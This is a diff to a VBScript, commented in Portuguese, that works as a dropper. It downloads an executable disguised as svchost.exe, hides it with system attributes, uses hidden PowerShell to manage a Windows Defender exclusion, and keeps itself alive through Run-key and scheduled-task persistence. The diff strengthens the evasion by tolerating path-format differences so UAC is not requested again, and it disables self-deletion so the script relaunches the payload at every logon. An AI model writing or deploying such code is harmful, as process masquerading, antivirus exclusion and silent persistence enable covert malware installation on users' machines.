@@ -10,6 +10,9 @@
 '   1. Se svchost.exe já existe e está rodando → sai (Run continua no VBS).
 '   2. Se não existe → baixa. Sucesso roda. Falha sai silencioso.
 '   Em todos os casos: Run fica com o VBS.
+'
+' Auto-recuperação: o PASSO 9 está COMENTADO, então o VBS não se apaga
+' e continua rodando a cada logon. Se o svchost.exe cair, ele relança.
 
 Option Explicit
 
@@ -108,12 +111,20 @@ shell.Run "attrib +h +s """ & destino & """", 0, True
 On Error Goto 0
 
 ' =====================================================================
-' PASSO 3 — Exclusão no Windows Defender (UAC 1x)
+' PASSO 3 — Exclusão no Windows Defender (UAC só na 1ª vez)
+' =====================================================================
+' Checagem tolerante: ignora case E barra invertida no final.
+' Isso evita pedir UAC de novo quando o Windows salvou o path com
+' formatação diferente da que estamos passando.
 ' =====================================================================
 psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
-            "$p = '" & pastaDefender & "'; " & _
-            "$excl = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath; " & _
-            "if ($excl -contains $p) { exit 0 } else { exit 1 }" & _
+            "$alvo = '" & pastaDefender & "'.TrimEnd('\').ToLower(); " & _
+            "$excl = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath); " & _
+            "$achou = $false; " & _
+            "foreach ($e in $excl) { " & _
+            "  if ($e -and $e.ToString().TrimEnd('\').ToLower() -eq $alvo) { $achou = $true; break } " & _
+            "}; " & _
+            "if ($achou) { exit 0 } else { exit 1 }" & _
             """"
 
 rc = 1
@@ -230,15 +241,14 @@ shell.Run psTask, 0, True
 On Error Goto 0
 
 ' =====================================================================
-' PASSO 9 — Auto-deleta o .vbs
+' PASSO 9 — Auto-deleta o .vbs (COMENTADO = auto-recuperação)
 ' =====================================================================
-' ATENÇÃO: o VBS se apaga, MAS a entrada no Run continua apontando pra
-' ele. Na próxima vez que o Windows tentar rodar o Run, o arquivo não
-' existe → Windows ignora silenciosamente. Isso é seguro: o svchost.exe
-' já está rodando via o próprio Windows (Run do .exe ou outra forma).
+' Se DESCOMENTAR, o VBS se apaga do %TEMP% depois de rodar. Mas a
+' entrada no Run continua apontando pra ele — e na próxima vez que o
+' Windows tentar rodar, o arquivo não existe mais → nada acontece.
 '
-' Se você NÃO quer que o VBS se auto-delete (pra ele poder rodar de novo
-' no próximo logon enquanto o .exe não estiver 100% estável), COMENTE a
-' linha abaixo.
+' Como está COMENTADO: o VBS FICA no disco e roda a cada logon,
+' checando se o svchost.exe está vivo. Se não estiver, ele relança.
+' Isso é o modo "auto-recuperação" — recomendado pra lan house.
 ' =====================================================================
-shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
+' shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
